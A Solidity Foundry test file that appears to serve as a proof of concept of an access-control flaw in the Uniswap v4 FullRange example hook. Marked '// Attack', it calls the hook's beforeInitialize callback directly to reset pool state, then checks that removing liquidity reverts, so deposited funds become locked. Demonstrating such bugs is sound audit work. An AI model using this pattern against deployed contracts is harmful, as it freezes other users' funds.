// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {GasSnapshot} from "forge-gas-snapshot/GasSnapshot.sol";
import {Hooks} from "@uniswap/v4-core/contracts/libraries/Hooks.sol";
import {FullRange} from "@uniswap/v4-periphery/contracts/hooks/examples/FullRange.sol";
import {FullRangeImplementation} from "@uniswap/v4-periphery/test/shared/implementation/FullRangeImplementation.sol";
import {PoolManager} from "@uniswap/v4-core/contracts/PoolManager.sol";
import {IPoolManager} from "@uniswap/v4-core/contracts/interfaces/IPoolManager.sol";
import {Deployers} from "@uniswap/v4-core/test/foundry-tests/utils/Deployers.sol";
import {MockERC20} from "@uniswap/v4-core/test/foundry-tests/utils/MockERC20.sol";
import {Currency, CurrencyLibrary} from "@uniswap/v4-core/contracts/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/contracts/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/contracts/types/PoolKey.sol";
import {PoolModifyPositionTest} from "@uniswap/v4-core/contracts/test/PoolModifyPositionTest.sol";
import {PoolSwapTest} from "@uniswap/v4-core/contracts/test/PoolSwapTest.sol";
import {IHooks} from "@uniswap/v4-core/contracts/interfaces/IHooks.sol";
import {UniswapV4ERC20} from "@uniswap/v4-periphery/contracts/libraries/UniswapV4ERC20.sol";
import {FullMath} from "@uniswap/v4-core/contracts/libraries/FullMath.sol";
import {SafeCast} from "@uniswap/v4-core/contracts/libraries/SafeCast.sol";

contract TestBadFullRange is Test, Deployers, GasSnapshot {
    using PoolIdLibrary for PoolKey;
    using SafeCast for uint256;
    using CurrencyLibrary for Currency;

    event Initialize(
        PoolId indexed poolId,
        Currency indexed currency0,
        Currency indexed currency1,
        uint24 fee,
        int24 tickSpacing,
        IHooks hooks
    );
    event ModifyPosition(
        PoolId indexed poolId, address indexed sender, int24 tickLower, int24 tickUpper, int256 liquidityDelta
    );
    event Swap(
        PoolId indexed id,
        address indexed sender,
        int128 amount0,
        int128 amount1,
        uint160 sqrtPriceX96,
        uint128 liquidity,
        int24 tick,
        uint24 fee
    );

    /// @dev Min tick for full range with tick spacing of 60
    int24 internal constant MIN_TICK = -887220;
    /// @dev Max tick for full range with tick spacing of 60
    int24 internal constant MAX_TICK = -MIN_TICK;

    int24 constant TICK_SPACING = 60;
    uint16 constant LOCKED_LIQUIDITY = 1000;
    uint256 constant MAX_DEADLINE = 12329839823;
    uint256 constant MAX_TICK_LIQUIDITY = 11505069308564788430434325881101412;
    uint8 constant DUST = 30;

    MockERC20 token0;
    MockERC20 token1;
    MockERC20 token2;

    Currency currency0;
    Currency currency1;

    PoolManager manager;
    FullRangeImplementation fullRange = FullRangeImplementation(
        address(uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_MODIFY_POSITION_FLAG | Hooks.BEFORE_SWAP_FLAG))
    );

    PoolKey key;
    PoolId id;

    PoolKey key2;
    PoolId id2;

    // For a pool that gets initialized with liquidity in setUp()
    PoolKey keyWithLiq;
    PoolId idWithLiq;

    PoolModifyPositionTest modifyPositionRouter;
    PoolSwapTest swapRouter;

    function setUp() public {
        token0 = new MockERC20("TestA", "A", 18, 2 ** 128);
        token1 = new MockERC20("TestB", "B", 18, 2 ** 128);
        token2 = new MockERC20("TestC", "C", 18, 2 ** 128);

        manager = new PoolManager(500000);

        FullRangeImplementation impl = new FullRangeImplementation(manager, fullRange);
        vm.etch(address(fullRange), address(impl).code);

        key = createPoolKey(token0, token1);
        id = key.toId();

        modifyPositionRouter = new PoolModifyPositionTest(manager);
        swapRouter = new PoolSwapTest(manager);

        token0.approve(address(fullRange), type(uint256).max);
        token1.approve(address(fullRange), type(uint256).max);
        token0.approve(address(swapRouter), type(uint256).max);
        token1.approve(address(swapRouter), type(uint256).max);
    }

    function test_abuser_FullRange_removeLiquidityForOverridenPool() public {
        manager.initialize(key, SQRT_RATIO_1_1, ZERO_BYTES);

        uint256 prevBalance0 = key.currency0.balanceOfSelf();
        uint256 prevBalance1 = key.currency1.balanceOfSelf();

        fullRange.addLiquidity(
            FullRange.AddLiquidityParams(
                key.currency0, key.currency1, 3000, 10 ether, 10 ether, 9 ether, 9 ether, address(this), MAX_DEADLINE
            )
        );

        (, address liquidityToken) = fullRange.poolInfo(id);

        assertEq(UniswapV4ERC20(liquidityToken).balanceOf(address(this)), 10 ether - LOCKED_LIQUIDITY);

        assertEq(key.currency0.balanceOfSelf(), prevBalance0 - 10 ether);
        assertEq(key.currency1.balanceOfSelf(), prevBalance1 - 10 ether);

        UniswapV4ERC20(liquidityToken).approve(address(fullRange), type(uint256).max);

        // Attack
        fullRange.beforeInitialize(address(uint160(0xdeadbeef)), key, 0, "");

        // Check if removal reverts
        vm.expectRevert();
        fullRange.removeLiquidity(
            FullRange.RemoveLiquidityParams(key.currency0, key.currency1, 3000, 5 ether, MAX_DEADLINE)
        );
    }

    function createPoolKey(MockERC20 tokenA, MockERC20 tokenB) internal view returns (PoolKey memory) {
        if (address(tokenA) > address(tokenB)) (tokenA, tokenB) = (tokenB, tokenA);
        return PoolKey(Currency.wrap(address(tokenA)), Currency.wrap(address(tokenB)), 3000, TICK_SPACING, fullRange);
    }
}
